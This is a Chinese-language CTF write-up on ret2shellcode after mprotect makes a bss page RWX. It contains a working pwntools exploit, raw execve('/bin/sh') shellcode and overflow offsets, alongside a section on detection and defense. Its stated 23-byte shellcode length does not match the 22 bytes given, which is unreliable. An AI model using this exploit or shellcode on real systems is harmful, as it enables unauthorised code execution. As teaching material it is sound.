---
id: binary-pwn-stack-ret2shellcode-mprotect-bss-rwx-page
title: mprotect 将 bss 页改为 RWX 后的 ret2shellcode：短 shellcode 写入全局缓冲区再覆盖返回地址
type: scenario
domain: binary
path: binary/pwn/stack
technique: ret2shellcode-mprotect-bss-rwx
aliases:
- mprotect ret2shellcode
- bss 页可执行
- GDOUCTF Shellcode
- 短 shellcode 23 字节
- 全局变量写 shellcode
- RWX 页利用
tags:
- pwn
- ret2shellcode
- mprotect
- bss
- rwx
- shellcode
- 64bit
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V117
  verified_at: '2026-11-06T01:44:57+08:00'
  notes: 已对照原文与29张图核对：GDOUCTF 2023 Shellcode 主函数 buf[10] 位于 rbp-0xA、mprotect 将 &stdout 所在 bss 页置 RWX、read(0,&name,0x25)、第二次 read(0,buf,0x40)；name_address=0x6010A0 与最终脚本一致，偏移 0x0A+8=0x12 与原文一致；23/22 字节短 shellcode 以原文最终脚本 b0 3b 版本为准（该版本实为22字节，正文另列 6a 3b 58 的23字节版本）。未验证点：未复跑 exp；无受影响版本/CVE；frontmatter 无 sources/source_url。
---

## 一句话结论

当程序自己调用 `mprotect` 把包含全局变量 `name` 的 bss 页改成 RWX，随后又用 `read(0, name, 0x25)` 接收数据、并在另一个栈缓冲区上存在溢出时，可以把 23 字节短 shellcode 写进 `name`，再覆盖返回地址跳到 `name` 执行，从而绕过 NX 获取 shell。

## 原理

- NX 开启时栈通常不可执行，直接把 shellcode 写到栈上再跳过去会失败；但 NX 是按页设置的，如果程序主动对一个页调用 `mprotect(addr, len, PROT_READ|PROT_WRITE|PROT_EXEC)`，该页就变成 RWX，可以执行写入的代码。
- 案例主函数执行 `mprotect((void *)((unsigned long)&stdout & ~0xfff), 0x1000, 7)`，把包含 `stdout`/`name` 的 bss 页改为 RWX；`name` 是全局变量，位于该页内，`read(0, &name, 0x25)` 允许写入最多 0x25 字节。
- 另一处 `char buf[10]` 后 `read(0, buf, 0x40)` 存在栈溢出：`buf` 到 saved RBP 为 0x0A 字节，64 位下再加 8 字节 saved RBP，即可覆盖返回地址。
- 把 23 字节的 `execve("/bin/sh", NULL, NULL)` shellcode 写入 `name`，再把返回地址改为 `name` 的地址，函数返回时跳入 shellcode 执行。
- 关键坑：不能把 shellcode 写到栈上再指望它执行（栈页仍不可执行）；也不能只“写入”而不取得控制流，必须用溢出覆盖返回地址或函数指针跳到 RWX 页。

## 触发条件

- 64 位（或 32 位）ELF，存在栈溢出且能覆盖返回地址。
- 程序对 bss/其他可写页调用 `mprotect(..., PROT_READ|PROT_WRITE|PROT_EXEC)`，或该页本身已是 RWX。
- 有可控的全局缓冲区可写入 shellcode，长度足够（案例 `name` 最多 0x25 字节，23 字节 shellcode 够用）。
- 能获得该全局缓冲区的固定地址（无 PIE 或已泄露基址）。

## 利用步骤

1. 反编译主函数，确认 `mprotect` 的 `addr`、`len`、`prot`；用 `vmmap`/`readelf -l` 确认目标页在运行时为 `rwx`。
2. 确认全局缓冲区 `name` 的地址与最大可写长度（案例 0x25 字节）。
3. 确认栈缓冲区到返回地址的偏移：案例 `buf[10]` 位于 `rbp-0xA`，偏移为 `0x0A + 8 = 0x12`（18 字节）。
4. 构造 23 字节短 shellcode（`execve("/bin/sh", NULL, NULL)`），先发送给第一次 `read` 写入 `name`。
5. 构造第二阶段 payload：`b"a"*0x12 + p64(name_addr)`，发送给第二次 `read` 覆盖返回地址。
6. 函数返回时跳到 `name` 执行 shellcode；若失败，检查页权限、地址是否正确、shellcode 是否被截断/含 `\x00`、栈对齐。

## PoC

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")
io = remote("target", 28479)

name_address = 0x6010A0
# 23 字节 execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

io.sendlineafter(b"Please.", shellcode)          # 第一次 read -> name
payload = b"a" * (0x0A + 0x8) + p64(name_address) # 第二次 read -> 覆盖返回地址
io.sendlineafter(b"start!", payload)
io.interactive()
```

```c
// 题目关键逻辑（简化）
char buf[10];                       // [rsp+6h] [rbp-Ah]
mprotect((void *)((unsigned long)&stdout & ~0xfff), 0x1000, 7);
read(0, &name, 0x25);               // 写入 shellcode 到 bss
read(0, buf, 0x40);                 // 栈溢出覆盖返回地址
```

说明：32 位短 shellcode 可用 21 字节 `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`；64 位案例为 23 字节版本。

## 变体与关联

- 变体：程序用 `mmap(PROT_EXEC)` 分配可执行内存，或直接把 `.text` 段改为可写后写入 shellcode。
- 变体：没有现成 `mprotect` 调用时，可用 ROP 调用 `mprotect`（需要 `pop rdi/rsi/rdx` 或 `ret2csu`）把 bss 页改为 RWX，再跳入 shellcode。
- 变体：shellcode 长度受限时使用短 shellcode、分段写入、自修改 shellcode 或 ORW（seccomp 场景）。
- 变体：`checksec` 显示 `NX unknown - GNU_STACK missing` 不等于栈可执行，必须以 `vmmap`/`readelf -l` 的实际页权限为准。
- 关联：[[binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw]]（RWX 页与 seccomp ORW）、[[binary-pwn-stack-ret2syscall-32bit]]（ROP 调系统调用）、[[binary-pwn-stack-ret2text-win-plus-one-align]]（栈溢出控制返回地址）。

## 检测与防御

- 防御：不要对包含用户可写数据的页授予执行权限；`mprotect`/`mmap` 使用最小权限（RW 而非 RWX）。
- 防御：开启 NX、PIE、ASLR、Canary、Full RELRO；对 JIT/解释器类需求使用 W^X（写时不可执行、执行时不可写）。
- 检测：进程内存映射中出现匿名 `rwx` 页；`mprotect(PROT_EXEC)` 调用；栈溢出崩溃且返回地址指向 bss/堆等非代码段。
- 响应：定位 `mprotect` 调用与可控写入路径，审计所有 `read`/`gets` 边界；将可执行页改为不可执行并重新编译。
